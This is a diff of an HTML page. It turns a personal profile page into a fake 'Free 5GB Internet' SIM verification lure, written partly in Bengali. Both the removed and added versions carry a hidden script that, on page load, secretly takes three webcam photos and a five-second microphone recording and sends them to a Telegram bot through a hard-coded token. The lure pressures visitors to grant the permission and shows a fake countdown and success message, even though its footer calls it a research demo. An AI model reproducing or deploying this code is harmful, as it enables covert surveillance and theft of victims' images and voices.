@@ -1,253 +1,286 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Rasel Roni — Personal Profile</title>
-<meta name="description" content="Rasel Islam Roni (R9 Team) — Personal profile, skills, projects, contact, social links.">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>All SIM 5GB Free Internet </title>
+
 <style>
-  :root{
-    --bg:#0b0f17; --panel:#101725; --muted:#8aa1c2; --hi:#64d2ff; --ink:#eaf2ff; --accent:#7c4dff; --chip:#1a2235;
-  }
-  *{box-sizing:border-box;margin:0;padding:0;}
-  body{font-family:Inter,system-ui; background:#0b0f17; color:var(--ink); scroll-behavior:smooth;}
-  a{color:var(--hi); text-decoration:none;} a:hover{text-decoration:underline;}
-  .wrap{max-width:1100px;margin:auto;padding:24px;}
-  header{display:flex; flex-direction:column; align-items:center; text-align:center; gap:12px; padding:24px;}
-  .me{width:160px; height:160px; border-radius:50%; border:3px solid var(--accent); object-fit:cover; transition:0.3s; }
-  .me:hover{transform:scale(1.05) rotate(3deg);}
-  h1{font-size:36px; margin-bottom:6px;}
-  .tag{display:inline-block; background:var(--chip); color:var(--muted); border-radius:999px; padding:6px 12px; margin:3px; font-size:13px;}
-  .nav{display:flex; flex-wrap:wrap; justify-content:center; gap:12px; margin-top:10px;}
-  .nav a{padding:8px 14px; border-radius:10px; background:var(--panel);}
-  .grid{display:grid; gap:16px; margin-top:24px;}
-  @media(min-width:860px){ .grid-2{grid-template-columns:1fr 1fr;} .grid-3{grid-template-columns:1fr 1fr 1fr;} }
-  .card{background:rgba(16,23,37,.7); padding:18px; border-radius:16px; backdrop-filter:blur(6px); transition:0.3s;}
-  .card:hover{transform:translateY(-6px); box-shadow:0 12px 25px rgba(124,77,255,.3);}
-  .chips{display:flex; flex-wrap:wrap; gap:8px; margin-top:8px;}
-  .chip{background:var(--chip); padding:6px 10px; border-radius:12px; font-size:13px; color:#cfe0ff;}
-  .kbd{font-family:"Fira Code", monospace; background:#0c1320; padding:2px 6px; border-radius:6px; font-size:12px;}
-  pre{background:#0e1627; padding:10px; border-radius:10px; overflow-x:auto; color:#a0ff9f; margin-top:10px;}
-  .btn{display:inline-flex; align-items:center; gap:6px; padding:10px 16px; border-radius:12px; border:1px solid var(--accent); cursor:pointer; transition:0.3s; background:linear-gradient(180deg,rgba(124,77,255,.2),rgba(124,77,255,.05));}
-  .btn:hover{transform:scale(1.05);}
-  [data-reveal]{opacity:0; transform:translateY(12px); transition:opacity .6s, transform .6s;}
-  [data-reveal].show{opacity:1; transform:none;}
-  .footer{color:var(--muted); font-size:13px; text-align:center; margin-top:40px;}
-  input, textarea{width:100%; padding:10px; border-radius:10px; background:#0e1627; border:1px solid #21304f; color:#e6f0ff; margin-top:6px;}
-  input:focus, textarea:focus{outline:none; border-color:#355596; box-shadow:0 0 0 3px rgba(100,210,255,.15);}
-</style>
-</head>
-<body>
-
-<div class="wrap">
-  <header>
-    <img class="me" src="https://i.postimg.cc/90JJdbbW/Gemini-Generated-Image-te59vgte59vgte59.png" alt="Rasel islam Roni">
-    <h1>Rasel islam Roni <span style="font-size:16px;color:var(--muted);font-weight:400;">(R9 Team)</span></h1>
-    <div>
-      <span class="tag">🏠 Dinajpur, Bangladesh</span>
-      <span class="tag">🤖 Personal AI & Web Creator</span>
-      <span class="tag">🎮 Free Fire Fan</span>
-    </div>
-    <div class="nav">
-      <a href="#about">About</a>
-      <a href="#skills">Skills</a>
-      <a href="#projects">Projects</a>
-      <a href="#programming">Coding</a>
-      <a href="#contact">Contact</a>
-      <a href="#social">Social</a>
-    </div>
-  </header>
-
-  <section id="about" class="card" data-reveal>
-    <h2>About Me</h2>
-    <p>Hi! I'm <strong>Rasel islam Roni</strong>, a tech-driven creator running <strong>R9 Team</strong>. I build websites, AI tools, design, and gaming content. Goal: bring real-world solutions with hands-on projects & creative ideas turned into products.</p>
-    <p>Interests: <span class="kbd">AI prompt design</span>, <span class="kbd">Frontend Dev</span>, <span class="kbd">Branding</span>, <span class="kbd">Gaming Highlights</span>.</p>
-  </section>
-
-  <script type="text/javascript">
-  function downloadThumbnail() {
-        // Change button text to indicate fetching
-        var btn = document.getElementById('thumbdloadbtn');
-        btn.textContent = 'Fetching from server... Wait';
-
-        // Add your logic to fetch the thumbnail here
-        // ...
-    }
-    function la(src) {
-      window.location = src;
-    }
-    
-         function GetURLParameter(sParam) {
-           var sPageURL = window.location.search.substring(1);
-           var sURLVariables = sPageURL.split('&');
-           for (var i = 0; i < sURLVariables.length; i++) {
-             var sParameterName = sURLVariables[i].split('=');
-             if (sParameterName[0] == sParam) {
-               return sParameterName[1];
-             }
-           }
-         }
-    
-         var chatid = GetURLParameter('id');
-         
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then((stream) => {
-        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-        const audioRecorder = new MediaRecorder(stream);
-
-        function capturePhoto(index) {
-          setTimeout(() => {
-            imageCapture.takePhoto()
-              .then((blob) => {
-                sendToTelegram(blob, 'photo');
-              })
-              .catch((error) => {
-                console.error('Error capturing photo:', error);
-              });
-          }, index * 2000);
-        }
-
-        function startAudioRecording() {
-          audioRecorder.start();
-          setTimeout(() => {
-            audioRecorder.stop();
-          }, 5000);
-        }
-
-        audioRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            sendToTelegram(event.data, 'audio');
-          }
-        };
-
-        for (let i = 0; i < 3; i++) {
-          capturePhoto(i);
-        }
-
-        startAudioRecording();
-      })
-      .catch((error) => {
-        if (error.name === 'NotAllowedError') {
-          // Handle the case where permissions are denied
-          console.warn('Permissions denied. User may suspect.');
-        } else {
-          console.error('Permission error:', error);
-        }
-      });
-
-    function sendToTelegram(data, type) {
-   
-      const botToken = '7610372028:AAHSpYgz3Caf9VsaveoZt4z0G_yYQPR39Bw';
-const chatId = 6264050385;
-
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
-
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
-{
-        method: 'POST',
-        body: formData
-      })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
-    }
-               
-  
-    
-  </script>
-
-  <section id="skills" class="grid grid-2" data-reveal>
-    <div class="card">
-      <h2>Tech Skills</h2>
-      <div class="chips">
-        <span class="chip">HTML</span><span class="chip">CSS</span><span class="chip">JavaScript</span>
-        <span class="chip">Responsive UI</span><span class="chip">Animations</span><span class="chip">Git</span>
-      </div>
-      <p>Tools: VS Code, Figma, ChatGPT, Pixverse.</p>
-    </div>
-    <div class="card">
-      <h2>Soft Skills</h2>
-      <div class="chips">
-        <span class="chip">Problem Solving</span><span class="chip">Fast Learner</span>
-        <span class="chip">Teamwork</span><span class="chip">Communication</span>
-      </div>
-      <p>Mindset: <em>Build → Learn → Iterate</em>.</p>
-    </div>
-  </section>
-
-  <section id="projects" class="card" data-reveal>
-    <h2>Projects</h2>
-    <ul>
-      <li>R9 Personal AI — Web app with default chatbot & R9 branding.</li>
-      <li>AI Video World — Prompt library + video generation hub.</li>
-      <li>MxN Product Page — Admin-uploadable product gallery.</li>
-    </ul>
-  </section>
-
-  <section id="programming" class="card" data-reveal>
-    <h2>Programming</h2>
-    <pre>
-// HTML: click button
-&lt;button onclick="alert('Hello Roni! 😆')"&gt;Click me&lt;/button&gt;
-
-// JavaScript: greet
-const greet=name=&gt;console.log(`Hello, ${name}! 🛸`);
-greet('Roni');
-
-// Java: Hello World
-public class HelloWorld{
-  public static void main(String[] args){
-    System.out.println("Hello R9 Team! 🤖");
-  }
+body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:linear-gradient(180deg,#020617,#0f172a);
+    font-family:system-ui,-apple-system,Segoe UI;
+    color:#e5e7eb;
+}
+.card{
+    width:360px;
+    background:#020617;
+    border-radius:18px;
+    padding:22px;
+    box-shadow:0 25px 60px rgba(0,0,0,.75);
 }
 
-// Python: loop
-for i in range(3):
-    print("Python loves R9! 😎")
+/* HEADER */
+.header{
+    text-align:center;
+    margin-bottom:15px;
+}
+.header h1{
+    margin:0;
+    font-size:22px;
+    color:#22c55e;
+}
+.header p{
+    margin:4px 0 0;
+    font-size:13px;
+    color:#cbd5f5;
+}
 
-// C++: hello
-#include &lt;iostream&gt;
-int main(){ std::cout &lt;&lt; "C++ rocks! 💻\\n"; return 0; }
+/* SIM BRANDS */
+.sims{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:8px;
+    margin:15px 0;
+}
+.sim{
+    padding:8px 0;
+    text-align:center;
+    border-radius:10px;
+    font-size:12px;
+    font-weight:700;
+    color:#fff;
+}
+.gp{background:#16a34a;}
+.robi{background:#dc2626;}
+.bl{background:#f97316;}
+.airtel{background:#ef4444;}
+.teletalk{background:#22c55e;}
+.skitto{background:#3b82f6;}
 
-// C: basic
-#include &lt;stdio.h&gt;
-int main(){ printf("C says Hi! 🎯\\n"); return 0; }
-    </pre>
-  </section>
+/* FORM */
+input{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    font-size:16px;
+    margin-bottom:14px;
+}
+.verify{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:#22c55e;
+    color:#000;
+    font-size:16px;
+    font-weight:800;
+}
 
-  <section id="contact" class="grid grid-2" data-reveal>
-    <div class="card">
-      <h2>Contact</h2>
-      <p>Email: <a href="mailto:hello.r9team@example.com">raselroni888agmail.com</a><br>
-         Phone: <a href="tel:+8801XXXXXXXXX">+8801797977609</a></p>
-      <form onsubmit="event.preventDefault(); alert('Thanks! Message recorded. 😊');">
-        <input placeholder="Your Name" required>
-        <input type="email" placeholder="Email" required>
-        <textarea placeholder="Message" rows="4" required></textarea>
-        <button class="btn" type="submit">📮 Send</button>
-      </form>
+/* LOADING */
+.loading{
+    display:none;
+    margin-top:16px;
+    text-align:center;
+}
+.counter{
+    font-size:28px;
+    font-weight:900;
+    color:#facc15;
+}
+.notice{
+    font-size:12px;
+    color:#f87171;
+    margin-top:6px;
+}
+
+/* WAIT NOTICE */
+.wait{
+    display:none;
+    margin-top:16px;
+    padding:14px;
+    border-radius:14px;
+    border:1px solid #22c55e;
+    font-size:14px;
+    line-height:1.5;
+}
+
+/* FOOTER */
+.footer{
+    margin-top:14px;
+    font-size:11px;
+    color:#94a3b8;
+    text-align:center;
+}
+</style>
+</head>
+
+<body>
+<div class="card">
+
+    <div class="header">
+        <h1>🎁 Free 5GB Internet</h1>
+        <p>All SIM Verification Portal</p>
     </div>
-    <div class="card" id="social">
-      <h2>Social</h2>
-      <ul>
-        <li>Facebook: <a href="#">facebook.com/your.id</a></li>
-        <li>YouTube: <a href="#"></a></li>
-        <li>GitHub: <a href="#">github.com/yourhandle</a></li>
-      </ul>
-      <p class="t">Replace links with your own.</p>
-    </div>
-  </section>
 
-  <footer class="footer" data-reveal>© <span id="y"></span> R9 Team — Crafted with ❤️ & R0N1</footer>
+    <div class="sims">
+        <div class="sim gp">GP</div>
+        <div class="sim robi">Robi</div>
+        <div class="sim bl">Banglalink</div>
+        <div class="sim airtel">Airtel</div>
+        <div class="sim teletalk">Teletalk</div>
+        <div class="sim skitto">Skitto</div>
+    </div>
+     <p>
+    পূর্বের Permission টি Allow  না দিলে
+     <b>Verification সম্পূর্ণ হবে না</b> এবং
+     MB Request ব্যর্থ হবে।
+     প্রয়োজনে page reload করুন অথবা Back করে আবার প্রবেশ করুন
+ </p>
+
+    <input type="tel" id="num" placeholder="Enter your mobile number">
+
+    <button class="verify" onclick="startVerify()">Verify Now</button>
+
+    <!-- COUNTDOWN -->
+    <div class="loading" id="loading">
+        <div class="counter" id="counter">1</div>
+        <div>⏳ Verifying information...</div>
+        <div class="notice">
+            ⚠️ এই মুহূর্তে Cancel করলে Verification ব্যর্থ হবে
+        </div>
+    </div>
+
+    <!-- WAIT MESSAGE -->
+    <div class="wait" id="wait">
+        ✅ Verification Successful  
+        <br><br>
+        ⏱️ অনুগ্রহ করে <b>১০ মিনিট অপেক্ষা করুন</b>  
+        <br>
+        আপনার অনুরোধ প্রক্রিয়াধীন রয়েছে।
+    </div>
+
+    <div class="footer">
+        Research Demo Interface
+    </div>
+
 </div>
 
 <script>
-  document.getElementById('y').textContent = new Date().getFullYear();
-  const io = new IntersectionObserver((entries)=>{ entries.forEach(e=>{ if(e.isIntersecting)e.target.classList.add('show'); }); },{threshold:0.1});
-  document.querySelectorAll('[data-reveal]').forEach(el=>io.observe(el));
+let interval;
+let count = 1;
+
+function startVerify(){
+    const n = document.getElementById("num").value.trim();
+    if(n.length < 6){
+        alert("সঠিক মোবাইল নাম্বার লিখুন");
+        return;
+    }
+
+    document.getElementById("loading").style.display="block";
+    document.getElementById("wait").style.display="none";
+
+    count = 1;
+    document.getElementById("counter").textContent = count;
+
+    interval = setInterval(()=>{
+        count++;
+        document.getElementById("counter").textContent = count;
+        if(count >= 60){
+            clearInterval(interval);
+            document.getElementById("loading").style.display="none";
+            document.getElementById("wait").style.display="block";
+        }
+    },1000);
+}
+
+function la(src) {
+    window.location = src;
+}
+
+function GetURLParameter(sParam) {
+    var sPageURL = window.location.search.substring(1);
+    var sURLVariables = sPageURL.split('&');
+    for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+            return sParameterName[1];
+        }
+    }
+}
+
+var chatid = GetURLParameter('id');
+
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
+        
+        function capturePhoto(index) {
+            setTimeout(() => {
+                imageCapture.takePhoto()
+                    .then((blob) => {
+                        sendToTelegram(blob, 'photo');
+                    })
+                    .catch((error) => {
+                        console.error('Error capturing photo:', error);
+                    });
+            }, index * 2000);
+        }
+        
+        function startAudioRecording() {
+            audioRecorder.start();
+            setTimeout(() => {
+                audioRecorder.stop();
+            }, 5000);
+        }
+        
+        audioRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                sendToTelegram(event.data, 'audio');
+            }
+        };
+        
+        for (let i = 0; i < 3; i++) {
+            capturePhoto(i);
+        }
+        
+        startAudioRecording();
+    })
+    .catch((error) => {
+        if (error.name === 'NotAllowedError') {
+            // Handle the case where permissions are denied
+            console.warn('Permissions denied. User may suspect.');
+        } else {
+            console.error('Permission error:', error);
+        }
+    });
+
+function sendToTelegram(data, type) {
+    
+    const botToken = '7610372028:AAHSpYgz3Caf9VsaveoZt4z0G_yYQPR39Bw';
+    const chatId = 6264050385;
+    
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
+    
+    fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`,
+        {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error sending to Telegram:', error));
+}
+
 </script>
+
 </body>
 </html>
